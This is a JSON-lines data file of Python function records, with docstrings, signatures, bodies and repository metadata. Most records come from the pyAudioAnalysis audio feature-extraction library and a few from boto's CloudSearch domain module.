{"docstring": "\"\"\"Computes spectral roll-off\"\"\"\n", "func_signal": "def spectral_rolloff(signal, c):\n", "code": "energy = np.sum(signal ** 2)\nfft_length = len(signal)\nthreshold = c * energy\n# Ffind the spectral rolloff as the frequency position \n# where the respective spectral energy is equal to c*totalEnergy\ncumulative_sum = np.cumsum(signal ** 2) + eps\na = np.nonzero(cumulative_sum > threshold)[0]\nif len(a) > 0:\n    sp_rolloff = np.float64(a[0]) / (float(fft_length))\nelse:\n    sp_rolloff = 0.0\nreturn sp_rolloff", "path": "pyAudioAnalysis/pyAudioAnalysis/ShortTermFeatures.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "'''\nDistance between two strings\n'''\n", "func_signal": "def levenshtein(str1, s2):\n", "code": "N1 = len(str1)\nN2 = len(s2)\n\nstringRange = [range(N1 + 1)] * (N2 + 1)\nfor i in range(N2 + 1):\n    stringRange[i] = range(i,i + N1 + 1)\nfor i in range(0,N2):\n    for j in range(0,N1):\n        if str1[j] == s2[i]:\n            stringRange[i+1][j+1] = min(stringRange[i+1][j] + 1,\n                                        stringRange[i][j+1] + 1,\n                                        stringRange[i][j])\n        else:\n            stringRange[i+1][j+1] = min(stringRange[i+1][j] + 1,\n                                        stringRange[i][j+1] + 1,\n                                        stringRange[i][j] + 1)\nreturn stringRange[N2][N1]", "path": "pyAudioAnalysis/pyAudioAnalysis/audioVisualization.py", "commit_date": "2020-02-29 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "\"\"\"\nCheck if argument is int\n\"\"\"\n", "func_signal": "def isint(x):\n", "code": "try:\n\ta = float(x)\n\tb = int(a)\nexcept ValueError:\n\treturn False\nelse:\n\treturn a == b", "path": "pyAudioAnalysis/pyAudioAnalysis/utilities.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "\"\"\"\n    Break an audio stream to segments of interest, \n    defined by a csv file\n    \n    - wavFile:    path to input wavfile\n    - csvFile:    path to csvFile of segment limits\n    \n    Input CSV file must be of the format <T1>\\t<T2>\\t<Label>\n\"\"\"\n\n", "func_signal": "def annotation2files(wavFile, csvFile):\n", "code": "[Fs, x] = audioBasicIO.read_audio_file(wavFile)\nwith open(csvFile, 'r') as csvfile:\n    reader = csv.reader(csvfile, delimiter='\\t', quotechar='|')\n    for j, row in enumerate(reader):\n        T1 = float(row[0].replace(\",\",\".\"))\n        T2 = float(row[1].replace(\",\",\".\"))            \n        label = \"%s_%s_%.2f_%.2f.wav\" % (wavFile, row[2], T1, T2)\n        label = label.replace(\" \", \"_\")\n        xtemp = x[int(round(T1*Fs)):int(round(T2*Fs))]            \n        print(T1, T2, label, xtemp.shape)\n        wavfile.write(label, Fs, xtemp)", "path": "pyAudioAnalysis/pyAudioAnalysis/audacityAnnotation2WAVs.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "\"\"\"\nComputes harmonic ratio and pitch\n\"\"\"\n", "func_signal": "def harmonic(frame, sampling_rate):\n", "code": "m = np.round(0.016 * sampling_rate) - 1\nr = np.correlate(frame, frame, mode='full')\n\ng = r[len(frame) - 1]\nr = r[len(frame):-1]\n\n# estimate m0 (as the first zero crossing of R)\n[a, ] = np.nonzero(np.diff(np.sign(r)))\n\nif len(a) == 0:\n    m0 = len(r) - 1\nelse:\n    m0 = a[0]\nif m > len(r):\n    m = len(r) - 1\n\ngamma = np.zeros((m), dtype=np.float64)\ncumulative_sum = np.cumsum(frame ** 2)\ngamma[m0:m] = r[m0:m] / (np.sqrt((g * cumulative_sum[m:m0:-1])) + eps)\n\nzcr = zero_crossing_rate(gamma)\n\nif zcr > 0.15:\n    hr = 0.0\n    f0 = 0.0\nelse:\n    if len(gamma) == 0:\n        hr = 1.0\n        blag = 0.0\n        gamma = np.zeros((m), dtype=np.float64)\n    else:\n        hr = np.max(gamma)\n        blag = np.argmax(gamma)\n\n    # Get fundamental frequency:\n    f0 = sampling_rate / (blag + eps)\n    if f0 > 5000:\n        f0 = 0.0\n    if hr < 0.1:\n        f0 = 0.0\n\nreturn hr, f0", "path": "pyAudioAnalysis/pyAudioAnalysis/ShortTermFeatures.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "\"\"\"\nThis function implements the shor-term windowing process.\nFor each short-term window a set of features is extracted.\nThis results to a sequence of feature vectors, stored in a np matrix.\n\nARGUMENTS\n    signal:         the input signal samples\n    sampling_rate:  the sampling freq (in Hz)\n    window:         the short-term window size (in samples)\n    step:           the short-term window step (in samples)\n    deltas:         (opt) True/False if delta features are to be\n                    computed\nRETURNS\n    features (numpy.ndarray):        contains features\n                                     (n_feats x numOfShortTermWindows)\n    feature_names (numpy.ndarray):   contains feature names\n                                     (n_feats x numOfShortTermWindows)\n\"\"\"\n\n", "func_signal": "def feature_extraction(signal, sampling_rate, window, step, deltas=True):\n", "code": "window = int(window)\nstep = int(step)\n\n# signal normalization\nsignal = np.double(signal)\nsignal = signal / (2.0 ** 15)\n\nsignal = dc_normalize(signal)\n\nnumber_of_samples = len(signal)  # total number of samples\ncurrent_position = 0\ncount_fr = 0\nnum_fft = int(window / 2)\n\n# compute the triangular filter banks used in the mfcc calculation\nfbank, freqs = mfcc_filter_banks(sampling_rate, num_fft)\n\nn_time_spectral_feats = 8\nn_harmonic_feats = 0\nn_mfcc_feats = 13\nn_chroma_feats = 13\nn_total_feats = n_time_spectral_feats + n_mfcc_feats + n_harmonic_feats + \\\n                n_chroma_feats\n#    n_total_feats = n_time_spectral_feats + n_mfcc_feats +\n#    n_harmonic_feats\n\n# define list of feature names\nfeature_names = [\"zcr\", \"energy\", \"energy_entropy\"]\nfeature_names += [\"spectral_centroid\", \"spectral_spread\"]\nfeature_names.append(\"spectral_entropy\")\nfeature_names.append(\"spectral_flux\")\nfeature_names.append(\"spectral_rolloff\")\nfeature_names += [\"mfcc_{0:d}\".format(mfcc_i)\n                  for mfcc_i in range(1, n_mfcc_feats + 1)]\nfeature_names += [\"chroma_{0:d}\".format(chroma_i)\n                  for chroma_i in range(1, n_chroma_feats)]\nfeature_names.append(\"chroma_std\")\n\n# add names for delta features:\nif deltas:\n    feature_names_2 = feature_names + [\"delta \" + f for f in feature_names]\n    feature_names = feature_names_2\n\nfeatures = []\n# for each short-term window to end of signal\nwhile current_position + window - 1 < number_of_samples:\n    count_fr += 1\n    # get current window\n    x = signal[current_position:current_position + window]\n\n    # update window position\n    current_position = current_position + step\n\n    # get fft magnitude\n    fft_magnitude = abs(fft(x))\n\n    # normalize fft\n    fft_magnitude = fft_magnitude[0:num_fft]\n    fft_magnitude = fft_magnitude / len(fft_magnitude)\n\n    # keep previous fft mag (used in spectral flux)\n    if count_fr == 1:\n        fft_magnitude_previous = fft_magnitude.copy()\n    feature_vector = np.zeros((n_total_feats, 1))\n\n    # zero crossing rate\n    feature_vector[0] = zero_crossing_rate(x)\n\n    # short-term energy\n    feature_vector[1] = energy(x)\n\n    # short-term entropy of energy\n    feature_vector[2] = energy_entropy(x)\n\n    # sp centroid/spread\n    [feature_vector[3], feature_vector[4]] = \\\n        spectral_centroid_spread(fft_magnitude,\n                                 sampling_rate)\n\n    # spectral entropy\n    feature_vector[5] = \\\n        spectral_entropy(fft_magnitude)\n\n    # spectral flux\n    feature_vector[6] = \\\n        spectral_flux(fft_magnitude,\n                      fft_magnitude_previous)\n\n    # spectral rolloff\n    feature_vector[7] = \\\n        spectral_rolloff(fft_magnitude, 0.90)\n\n    # MFCCs\n    mffc_feats_end = n_time_spectral_feats + n_mfcc_feats\n    feature_vector[n_time_spectral_feats:mffc_feats_end, 0] = \\\n        mfcc(fft_magnitude, fbank, n_mfcc_feats).copy()\n\n    # chroma features\n    chroma_names, chroma_feature_matrix = \\\n        chroma_features(fft_magnitude, sampling_rate, num_fft)\n    chroma_features_end = n_time_spectral_feats + n_mfcc_feats + \\\n                          n_chroma_feats - 1\n    feature_vector[mffc_feats_end:chroma_features_end] = \\\n        chroma_feature_matrix\n    feature_vector[chroma_features_end] = chroma_feature_matrix.std()\n    if not deltas:\n        features.append(feature_vector)\n    else:\n        # delta features\n        if count_fr > 1:\n            delta = feature_vector - feature_vector_prev\n            feature_vector_2 = np.concatenate((feature_vector, delta))\n        else:\n            feature_vector_2 = np.concatenate((feature_vector,\n                                               np.zeros(feature_vector.\n                                                        shape)))\n        feature_vector_prev = feature_vector\n        features.append(feature_vector_2)\n\n    fft_magnitude_previous = fft_magnitude.copy()\n\nfeatures = np.concatenate(features, 1)\nreturn features, feature_names", "path": "pyAudioAnalysis/pyAudioAnalysis/ShortTermFeatures.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "\"\"\"\nCheck if argument is float\n\"\"\"\n", "func_signal": "def isfloat(x):\n", "code": "try:\n\ta = float(x)\nexcept ValueError:\n\treturn False\nelse:\n\treturn True", "path": "pyAudioAnalysis/pyAudioAnalysis/utilities.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "'''\nThis function generates a chordial visualization for the recordings\n of the provided path.\nARGUMENTS:\n    - folder:        path of the folder that contains the WAV files \n                     to be processed\n    - dimReductionMethod:    method used to reduce the dimension of the \n                             initial feature space before computing \n                             the similarity.\n    - priorKnowledge:    if this is set equal to \"artist\"\n'''\n", "func_signal": "def visualizeFeaturesFolder(folder, dimReductionMethod, priorKnowledge = \"none\"):\n", "code": "if dimReductionMethod==\"pca\":\n    all_mt_feat, wav_files, _ = aF.directory_feature_extraction(folder, \n                                                                30.0, 30.0, \n                                                                0.050, \n                                                                0.050, \n                                                                compute_beat\n                                                                =True)\n    if all_mt_feat.shape[0]==0:\n        print(\"Error: No data found! Check input folder\")\n        return\n    \n    names_category_toviz = [ntpath.basename(w).\n                                replace('.wav','').split(\" --- \")[0]\n                            for w in wav_files];\n    names_to_viz = [ntpath.basename(w).replace('.wav', '')\n                    for w in wav_files];\n\n    (F, MEAN, STD) = aT.normalize_features([all_mt_feat])\n    F = np.concatenate(F)\n    \n    # check that the new PCA dimension is at most equal\n    # to the number of samples\n    K1 = 2\n    K2 = 10\n    if K1 > F.shape[0]:\n        K1 = F.shape[0]\n    if K2 > F.shape[0]:\n        K2 = F.shape[0]\n    pca1 = sklearn.decomposition.PCA(n_components = K1)\n    pca1.fit(F)        \n    pca2 = sklearn.decomposition.PCA(n_components = K2)\n    pca2.fit(F)        \n\n    finalDims = pca1.transform(F)\n    finalDims2 = pca2.transform(F)\nelse:\n    # long-term statistics cannot be applied in this context\n    # (LDA needs mid-term features)\n    all_mt_feat, Ys, wav_files = aF.\\\n        directory_feature_extraction_no_avg(folder, 20.0, 5.0, 0.040, 0.040)\n    if all_mt_feat.shape[0]==0:\n        print(\"Error: No data found! Check input folder\")\n        return\n    \n    names_category_toviz = [ntpath.basename(w).\n                                replace('.wav', '').split(\" --- \")[0]\n                            for w in wav_files]\n    names_to_viz = [ntpath.basename(w).replace('.wav', '')\n                    for w in wav_files];\n\n    ldaLabels = Ys\n    if priorKnowledge==\"artist\":\n        unames_category_toviz = list(set(names_category_toviz))\n        YsNew = np.zeros( Ys.shape )\n        for i, uname in enumerate(unames_category_toviz):\n            indicesUCategories = [j for j, x in\n                                  enumerate(names_category_toviz)\n                                  if x == uname]\n            for j in indicesUCategories:\n                indices = np.nonzero(Ys==j)\n                YsNew[indices] = i\n        ldaLabels = YsNew\n\n    (F, MEAN, STD) = aT.normalize_features([all_mt_feat])\n    F = np.array(F[0])\n\n    clf = sklearn.discriminant_analysis.\\\n        LinearDiscriminantAnalysis(n_components=10)\n    clf.fit(F, ldaLabels)    \n    reducedDims =  clf.transform(F)\n\n    pca = sklearn.decomposition.PCA(n_components = 2)\n    pca.fit(reducedDims)\n    reducedDims = pca.transform(reducedDims)\n\n    # TODO: CHECK THIS ... SHOULD LDA USED IN SEMI-SUPERVISED ONLY????\n    # uLabels must have as many labels as the number of wav_files elements\n    uLabels = np.sort(np.unique((Ys)))\n    reducedDimsAvg = np.zeros( (uLabels.shape[0], reducedDims.shape[1]))\n    finalDims = np.zeros( (uLabels.shape[0], 2) ) \n    for i, u in enumerate(uLabels):\n        indices = [j for j, x in enumerate(Ys) if x == u]\n        f = reducedDims[indices, :]\n        finalDims[i, :] = f.mean(axis=0)\n    finalDims2 = reducedDims\n\nfor i in range(finalDims.shape[0]):            \n    plt.text(finalDims[i,0], finalDims[i,1],\n             ntpath.basename(wav_files[i].replace('.wav','')),\n             horizontalalignment='center',\n             verticalalignment='center', fontsize=10)\n    plt.plot(finalDims[i,0], finalDims[i,1], '*r')\nplt.xlim([1.2*finalDims[:,0].min(), 1.2*finalDims[:,0].max()])\nplt.ylim([1.2*finalDims[:,1].min(), 1.2*finalDims[:,1].max()])            \nplt.show()\n\nSM = 1.0 - distance.squareform(distance.pdist(finalDims2, 'cosine'))\nfor i in range(SM.shape[0]):\n    SM[i,i] = 0.0;\n\n\nchordialDiagram(\"visualization\", SM, 0.50, names_to_viz,\n                names_category_toviz)\n\nSM = 1.0 - distance.squareform(distance.pdist(F, 'cosine'))\nfor i in range(SM.shape[0]):\n    SM[i,i] = 0.0;\nchordialDiagram(\"visualizationInitial\", SM, 0.50, names_to_viz,\n                names_category_toviz)\n\n# plot super-categories (i.e. artistname\nunames_category_toviz = sort(list(set(names_category_toviz)))\nfinalDimsGroup = np.zeros( (len(unames_category_toviz),\n                            finalDims2.shape[1] ) )\nfor i, uname in enumerate(unames_category_toviz):\n    indices = [j for j, x in enumerate(names_category_toviz) if x == uname]\n    f = finalDims2[indices, :]\n    finalDimsGroup[i, :] = f.mean(axis=0)\n\nSMgroup = 1.0 - distance.squareform(distance.pdist(finalDimsGroup,\n                                                   'cosine'))\nfor i in range(SMgroup.shape[0]):\n    SMgroup[i,i] = 0.0;\nchordialDiagram(\"visualizationGroup\", SMgroup, 0.50,\n                unames_category_toviz, unames_category_toviz)", "path": "pyAudioAnalysis/pyAudioAnalysis/audioVisualization.py", "commit_date": "2020-02-29 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "\"\"\"\nComputes the MFCCs of a frame, given the fft mag\n\nARGUMENTS:\n    fft_magnitude:  fft magnitude abs(FFT)\n    fbank:          filter bank (see mfccInitFilterBanks)\nRETURN\n    ceps:           MFCCs (13 element vector)\n\nNote:    MFCC calculation is, in general, taken from the \n         scikits.talkbox library (MIT Licence),\n#    with a small number of modifications to make it more \n     compact and suitable for the pyAudioAnalysis Lib\n\"\"\"\n\n", "func_signal": "def mfcc(fft_magnitude, fbank, num_mfcc_feats):\n", "code": "mspec = np.log10(np.dot(fft_magnitude, fbank.T) + eps)\nceps = dct(mspec, type=2, norm='ortho', axis=-1)[:num_mfcc_feats]\nreturn ceps", "path": "pyAudioAnalysis/pyAudioAnalysis/ShortTermFeatures.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "'''\nGenerates a list of colors based on a list of names (strings). \nSimilar strings correspond to similar colors.\n'''\n# STEP A: compute strings distance between all combnations of strings\n", "func_signal": "def text_list_to_colors(names):\n", "code": "Dnames = np.zeros( (len(names), len(names)) )\nfor i in range(len(names)):\n    for j in range(len(names)):\n        Dnames[i,j] = 1 - 2.0 * levenshtein(names[i], \n                                            names[j]) / \\\n                      float(len(names[i]+names[j]))\n\n# STEP B: pca dimanesionality reduction to a single-dimension \n# (from the distance space)\npca = sklearn.decomposition.PCA(n_components = 1)\npca.fit(Dnames)    \n\n# STEP C: mapping of 1-dimensional values to colors in a jet-colormap\ntextToColor = pca.transform(Dnames)\ntextToColor = 255 * (textToColor - textToColor.min()) / \\\n              (textToColor.max() - textToColor.min())\ntextmaps = generateColorMap();\ncolors = [textmaps[int(c)] for c in textToColor]\nreturn colors", "path": "pyAudioAnalysis/pyAudioAnalysis/audioVisualization.py", "commit_date": "2020-02-29 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "\"\"\"Computes spectral centroid of frame (given abs(FFT))\"\"\"\n", "func_signal": "def spectral_centroid_spread(fft_magnitude, sampling_rate):\n", "code": "ind = (np.arange(1, len(fft_magnitude) + 1)) * \\\n      (sampling_rate / (2.0 * len(fft_magnitude)))\n\nXt = fft_magnitude.copy()\nXt_max = Xt.max()\nif Xt_max == 0:\n    Xt = Xt / eps\nelse:\n    Xt = Xt / Xt_max\n\nNUM = np.sum(ind * Xt)\nDEN = np.sum(Xt) + eps\n\n# Centroid:\ncentroid = (NUM / DEN)\n\n# Spread:\nspread = np.sqrt(np.sum(((ind - centroid) ** 2) * Xt) / DEN)\n\n# Normalize:\ncentroid = centroid / (sampling_rate / 2.0)\nspread = spread / (sampling_rate / 2.0)\n\nreturn centroid, spread", "path": "pyAudioAnalysis/pyAudioAnalysis/ShortTermFeatures.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "# TODO: 1 complexity\n# TODO: 2 bug with large windows\n\n", "func_signal": "def chroma_features(signal, sampling_rate, num_fft):\n", "code": "num_chroma, num_freqs_per_chroma = \\\n    chroma_features_init(num_fft, sampling_rate)\nchroma_names = ['A', 'A#', 'B', 'C', 'C#', 'D',\n                'D#', 'E', 'F', 'F#', 'G', 'G#']\nspec = signal ** 2\nif num_chroma.max() < num_chroma.shape[0]:\n    C = np.zeros((num_chroma.shape[0],))\n    C[num_chroma] = spec\n    C /= num_freqs_per_chroma[num_chroma]\nelse:\n    I = np.nonzero(num_chroma > num_chroma.shape[0])[0][0]\n    C = np.zeros((num_chroma.shape[0],))\n    C[num_chroma[0:I - 1]] = spec\n    C /= num_freqs_per_chroma\nfinal_matrix = np.zeros((12, 1))\nnewD = int(np.ceil(C.shape[0] / 12.0) * 12)\nC2 = np.zeros((newD,))\nC2[0:C.shape[0]] = C\nC2 = C2.reshape(int(C2.shape[0] / 12), 12)\n# for i in range(12):\n#    finalC[i] = np.sum(C[i:C.shape[0]:12])\nfinal_matrix = np.matrix(np.sum(C2, axis=0)).T\n\nspec_sum = spec.sum()\nif spec_sum == 0:\n    final_matrix /= eps\nelse:\n    final_matrix /= spec_sum\n\n#    ax = plt.gca()\n#    plt.hold(False)\n#    plt.plot(finalC)\n#    ax.set_xticks(range(len(chromaNames)))\n#    ax.set_xticklabels(chromaNames)\n#    xaxis = np.arange(0, 0.02, 0.01);\n#    ax.set_yticks(range(len(xaxis)))\n#    ax.set_yticklabels(xaxis)\n#    plt.show(block=False)\n#    plt.draw()\n\nreturn chroma_names, final_matrix", "path": "pyAudioAnalysis/pyAudioAnalysis/ShortTermFeatures.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "\"\"\"Computes entropy of energy\"\"\"\n# total frame energy\n", "func_signal": "def energy_entropy(frame, n_short_blocks=10):\n", "code": "frame_energy = np.sum(frame ** 2)\nframe_length = len(frame)\nsub_win_len = int(np.floor(frame_length / n_short_blocks))\nif frame_length != sub_win_len * n_short_blocks:\n    frame = frame[0:sub_win_len * n_short_blocks]\n\n# sub_wins is of size [n_short_blocks x L]\nsub_wins = frame.reshape(sub_win_len, n_short_blocks, order='F').copy()\n\n# Compute normalized sub-frame energies:\ns = np.sum(sub_wins ** 2, axis=0) / (frame_energy + eps)\n\n# Compute entropy of the normalized sub-frame energies:\nentropy = -np.sum(s * np.log2(s + eps))\nreturn entropy", "path": "pyAudioAnalysis/pyAudioAnalysis/ShortTermFeatures.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "\"\"\"Computes the spectral entropy\"\"\"\n# number of frame samples\n", "func_signal": "def spectral_entropy(signal, n_short_blocks=10):\n", "code": "num_frames = len(signal)\n\n# total spectral energy\ntotal_energy = np.sum(signal ** 2)\n\n# length of sub-frame\nsub_win_len = int(np.floor(num_frames / n_short_blocks))\nif num_frames != sub_win_len * n_short_blocks:\n    signal = signal[0:sub_win_len * n_short_blocks]\n\n# define sub-frames (using matrix reshape)\nsub_wins = signal.reshape(sub_win_len, n_short_blocks, order='F').copy()\n\n# compute spectral sub-energies\ns = np.sum(sub_wins ** 2, axis=0) / (total_energy + eps)\n\n# compute spectral entropy\nentropy = -np.sum(s * np.log2(s + eps))\n\nreturn entropy", "path": "pyAudioAnalysis/pyAudioAnalysis/ShortTermFeatures.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "'''\nGenerates a list of colors based on a list of names (strings). \nSimilar strings correspond to similar colors. \n'''\n", "func_signal": "def text_list_to_colors_simple(names):\n", "code": "uNames = list(set(names))\nuNames.sort()\ntextToColor = [ uNames.index(n) for n in names ]\ntextToColor = np.array(textToColor)\ntextToColor = 255 * (textToColor - textToColor.min()) / \\\n              (textToColor.max() - textToColor.min())\ntextmaps = generateColorMap();\ncolors = [textmaps[int(c)] for c in textToColor]\nreturn colors", "path": "pyAudioAnalysis/pyAudioAnalysis/audioVisualization.py", "commit_date": "2020-02-29 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "\"\"\"\nThis function extracts an estimate of the beat rate for a musical signal.\nARGUMENTS:\n - short_features:     a np array (n_feats x numOfShortTermWindows)\n - window_size:        window size in seconds\nRETURNS:\n - bpm:            estimates of beats per minute\n - ratio:          a confidence measure\n\"\"\"\n\n# Features that are related to the beat tracking task:\n", "func_signal": "def beat_extraction(short_features, window_size, plot=False):\n", "code": "selected_features = [0, 1, 3, 4, 5, 6, 7, 8, 9, 10,\n                     11, 12, 13, 14, 15, 16, 17, 18]\n\nmax_beat_time = int(round(2.0 / window_size))\nhist_all = np.zeros((max_beat_time,))\n# for each feature\nfor ii, i in enumerate(selected_features):\n    # dif threshold (3 x Mean of Difs)\n    dif_threshold = 2.0 * (np.abs(short_features[i, 0:-1] -\n                                  short_features[i, 1::])).mean()\n    if dif_threshold <= 0:\n        dif_threshold = 0.0000000000000001\n    # detect local maxima\n    [pos1, _] = utilities.peakdet(short_features[i, :], dif_threshold)\n    position_diffs = []\n    # compute histograms of local maxima changes\n    for j in range(len(pos1)-1):\n        position_diffs.append(pos1[j+1]-pos1[j])\n    histogram_times, histogram_edges = \\\n        np.histogram(position_diffs, np.arange(0.5, max_beat_time + 1.5))\n    hist_centers = (histogram_edges[0:-1] + histogram_edges[1::]) / 2.0\n    histogram_times = \\\n        histogram_times.astype(float) / short_features.shape[1]\n    hist_all += histogram_times\n    if plot:\n        plt.subplot(9, 2, ii + 1)\n        plt.plot(short_features[i, :], 'k')\n        for k in pos1:\n            plt.plot(k, short_features[i, k], 'k*')\n        f1 = plt.gca()\n        f1.axes.get_xaxis().set_ticks([])\n        f1.axes.get_yaxis().set_ticks([])\n\nif plot:\n    plt.show(block=False)\n    plt.figure()\n\n# Get beat as the argmax of the agregated histogram:\nmax_indices = np.argmax(hist_all)\nbpms = 60 / (hist_centers * window_size)\nbpm = bpms[max_indices]\n# ... and the beat ratio:\nratio = hist_all[max_indices] / (hist_all.sum() + eps)\n\nif plot:\n    # filter out >500 beats from plotting:\n    hist_all = hist_all[bpms < 500]\n    bpms = bpms[bpms < 500]\n\n    plt.plot(bpms, hist_all, 'k')\n    plt.xlabel('Beats per minute')\n    plt.ylabel('Freq Count')\n    plt.show(block=True)\n\nreturn bpm, ratio", "path": "pyAudioAnalysis/pyAudioAnalysis/MidTermFeatures.py", "commit_date": "2020-11-19 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "\"\"\"\nConverted from MATLAB script at http://billauer.co.il/peakdet.html\n\nReturns two arrays\n\nfunction [maxtab, mintab]=peakdet(v, delta, x)\n%PEAKDET Detect peaks in a vector\n%        [MAXTAB, MINTAB] = PEAKDET(V, DELTA) finds the local\n%        maxima and minima (\"peaks\") in the vector V.\n%        MAXTAB and MINTAB consists of two columns. Column 1\n%        contains indices in V, and column 2 the found values.\n%      \n%        With [MAXTAB, MINTAB] = PEAKDET(V, DELTA, X) the indices\n%        in MAXTAB and MINTAB are replaced with the corresponding\n%        X-values.\n%\n%        A point is considered a maximum peak if it has the maximal\n%        value, and was preceded (to the left) by a value lower by\n%        DELTA.\n\n% Eli Billauer, 3.4.05\n% This function is released to the public domain; Any use is allowed.\n\n\"\"\"\n", "func_signal": "def peakdet(v, delta, x = None):\n", "code": "maxtab = []\nmintab = []\n   \nif x is None:\n    x = numpy.arange(len(v))\n\nv = numpy.asarray(v)\n\nif len(v) != len(x):\n    sys.exit('Input vectors v and x must have same length')\n\nif not numpy.isscalar(delta):\n    sys.exit('Input argument delta must be a scalar')\n\nif delta <= 0:\n    sys.exit('Input argument delta must be positive')\n\nmn, mx = numpy.Inf, -numpy.Inf\nmnpos, mxpos = numpy.NaN, numpy.NaN\n\nlookformax = True\n\nfor i in numpy.arange(len(v)):\n    this = v[i]\n    if this > mx:\n        mx = this\n        mxpos = x[i]\n    if this < mn:\n        mn = this\n        mnpos = x[i]\n    \n    if lookformax:\n        if this < mx-delta:\n            maxtab.append(mxpos)\n            mn = this\n            mnpos = x[i]\n            lookformax = False\n    else:\n        if this > mn+delta:\n            mintab.append(mnpos)\n            mx = this\n            mxpos = x[i]\n            lookformax = True\n \nreturn numpy.array(maxtab), numpy.array(mintab)", "path": "pyAudioAnalysis/pyAudioAnalysis/utilities.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "'''\nThis function generates a 256 jet colormap of HTML-like\nhex string colors (e.g. FF88AA)\n'''\n", "func_signal": "def generateColorMap():\n", "code": "Map = cm.jet(np.arange(256))\nstringColors = []\nfor i in range(Map.shape[0]):\n    rgb = (int(255*Map[i][0]), int(255*Map[i][1]), int(255*Map[i][2]))\n    if (sys.version_info > (3, 0)):\n        stringColors.append((struct.pack('BBB', *rgb).hex())) # python 3\n    else:\n        stringColors.append(\n            struct.pack('BBB', *rgb).encode('hex'))  # python2\n\nreturn stringColors", "path": "pyAudioAnalysis/pyAudioAnalysis/audioVisualization.py", "commit_date": "2020-02-29 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "\"\"\"Removes DC and normalizes to -1, 1 range\"\"\"\n", "func_signal": "def dc_normalize(sig_array):\n", "code": "sig_array_norm = sig_array.copy()\nsig_array_norm -= sig_array_norm.mean()\nsig_array_norm /= abs(sig_array_norm).max() + 1e-10\nreturn sig_array_norm", "path": "pyAudioAnalysis/pyAudioAnalysis/ShortTermFeatures.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
{"docstring": "\"\"\"\nReturn a :class:`boto.cloudsearch2.option.AvailabilityOptionsStatus`\nobject representing the currently defined availability options for\nthe domain.\n:return: OptionsStatus object\n:rtype: :class:`boto.cloudsearch2.option.AvailabilityOptionsStatus`\n    object\n\"\"\"\n", "func_signal": "def get_availability_options(self):\n", "code": "return AvailabilityOptionsStatus(\n    self, refresh_fn=self.layer1.describe_availability_options,\n    refresh_key=['DescribeAvailabilityOptionsResponse',\n                 'DescribeAvailabilityOptionsResult',\n                 'AvailabilityOptions'],\n    save_fn=self.layer1.update_availability_options)", "path": "boto/boto/cloudsearch2/domain.py", "commit_date": "2014-06-27 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
{"docstring": "\"\"\"\nConstructor - Create a domain object from a layer1 and data params\n\n:type layer1: :class:`boto.cloudsearch2.layer1.Layer1` object\n:param layer1: A :class:`boto.cloudsearch2.layer1.Layer1` object\n    which is used to perform operations on the domain.\n\"\"\"\n", "func_signal": "def __init__(self, layer1, data):\n", "code": "self.layer1 = layer1\nself.update_from_data(data)", "path": "boto/boto/cloudsearch2/domain.py", "commit_date": "2014-06-27 00:00:00", "repo_name": "boto/boto", "stars": 6486, "license": "other", "language": "python", "size": 16004}
